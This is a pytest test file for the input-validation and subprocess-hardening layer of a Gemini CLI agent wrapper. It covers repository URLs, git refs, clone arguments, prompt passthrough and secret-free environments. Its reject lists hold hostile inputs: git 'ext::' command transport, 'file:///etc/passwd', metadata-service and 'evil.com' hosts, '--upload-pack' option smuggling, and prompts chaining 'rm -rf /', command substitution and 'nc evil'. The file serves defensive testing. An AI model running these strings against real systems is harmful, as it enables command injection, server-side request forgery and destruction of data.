from __future__ import annotations

import pytest

from agents.gemini_cli_agent.security import (
    UnsafeInputError,
    build_clone_argv,
    build_gemini_argv,
    gemini_env,
    git_env,
    validate_ref,
    validate_repo_url,
)


@pytest.mark.parametrize("url,expected", [
    ("https://github.com/pallets/flask", "https://github.com/pallets/flask.git"),
    ("https://github.com/pallets/flask.git", "https://github.com/pallets/flask.git"),
    ("https://github.com/google/adk-python/", "https://github.com/google/adk-python.git"),
    ("  https://GITHUB.com/psf/requests  ", "https://github.com/psf/requests.git"),
])
def test_valid_urls(url, expected):
    assert validate_repo_url(url).clone_url == expected


@pytest.mark.parametrize("url", [
    "", "http://github.com/a/b", "ssh://git@github.com/a/b", "git@github.com:a/b.git",
    "git://github.com/a/b", "file:///etc/passwd", "ext::sh -c touch% /tmp/pwned",
    "https://user:token@github.com/a/b", "https://github.com:8443/a/b",
    "https://github.com/a/b?x=1", "https://github.com/a/b#frag",
    "https://github.com/a/b/tree/main", "https://github.com/a", "https://github.com/../b",
    "https://github.com/a/..", "https://github.com/-u/repo", "https://github.com/a/--upload-pack",
    "https://github.com.evil.com/a/b", "https://evil.com/github.com/a",
    "https://169.254.169.254/latest/meta-data", "https://localhost/a/b",
    "https://github.com/a/b;rm -rf", "https://github.com/a/b\nhttps://evil.com/x/y",
    "https://github.com/a/%2e%2e", "https://github.com\\@evil.com/a/b",
    "https://github.com/a/b c",
])
def test_rejects_unsafe_urls(url):
    with pytest.raises(UnsafeInputError):
        validate_repo_url(url)


def test_allowed_hosts_configurable(monkeypatch):
    monkeypatch.setenv("GEMINI_CLI_ALLOWED_HOSTS", "git.example.org")
    assert validate_repo_url("https://git.example.org/team/repo").host == "git.example.org"
    with pytest.raises(UnsafeInputError):
        validate_repo_url("https://github.com/a/b")


@pytest.mark.parametrize("ref", ["main", "v1.2.3", "release/2026-10"])
def test_valid_refs(ref):
    assert validate_ref(ref) == ref


@pytest.mark.parametrize("ref", ["--upload-pack=x", "-b", "a..b", "a b", "x;y", "main/",
                                 "a//b", "x.lock"])
def test_invalid_refs(ref):
    with pytest.raises(UnsafeInputError):
        validate_ref(ref)


def test_clone_argv_is_hardened_and_option_terminated():
    repo = validate_repo_url("https://github.com/pallets/flask")
    argv = build_clone_argv(repo, "/tmp/x/repo", "main")
    assert argv[-3:] == ["--", "https://github.com/pallets/flask.git", "/tmp/x/repo"]
    joined = " ".join(argv)
    for flag in ("protocol.allow=never", "protocol.https.allow=always", "core.symlinks=false",
                 "core.hooksPath=/dev/null", "--depth 1", "--single-branch", "--no-tags",
                 "--branch main"):
        assert flag in joined


def test_prompt_with_shell_metacharacters_stays_one_argument():
    hostile = "explain; rm -rf / && $(whoami) `id` | nc evil 1 > /etc/passwd"
    argv = build_gemini_argv(hostile, cli_bin="gemini")
    assert argv[argv.index("--prompt") + 1] == hostile
    assert argv.count(hostile) == 1
    assert argv[argv.index("--output-format"):][:2] == ["--output-format", "json"]
    assert argv[argv.index("--approval-mode"):][:2] == ["--approval-mode", "plan"]
    assert "--yolo" not in argv and "--skip-trust" not in argv and "-y" not in argv


def test_model_and_sandbox_options(monkeypatch):
    monkeypatch.setenv("GEMINI_CLI_MODEL", "gemini-3.8-flash")
    monkeypatch.setenv("GEMINI_CLI_SANDBOX", "true")
    argv = build_gemini_argv("p", cli_bin="gemini")
    assert argv[-3:] == ["--model", "gemini-3.8-flash", "--sandbox"]
    monkeypatch.setenv("GEMINI_CLI_MODEL", "x; rm -rf /")
    with pytest.raises(UnsafeInputError):
        build_gemini_argv("p", cli_bin="gemini")


def test_subprocess_environments_do_not_leak_secrets(monkeypatch):
    monkeypatch.setenv("DB_PASSWORD", "hunter2")
    monkeypatch.setenv("GITHUB_PERSONAL_ACCESS_TOKEN", "ghp_x")
    monkeypatch.setenv("GEMINI_API_KEY", "gemini-key")
    env = gemini_env()
    assert "DB_PASSWORD" not in env and "GITHUB_PERSONAL_ACCESS_TOKEN" not in env
    assert env["GEMINI_API_KEY"] == "gemini-key"
    genv = git_env()
    assert "GEMINI_API_KEY" not in genv and genv["GIT_TERMINAL_PROMPT"] == "0"
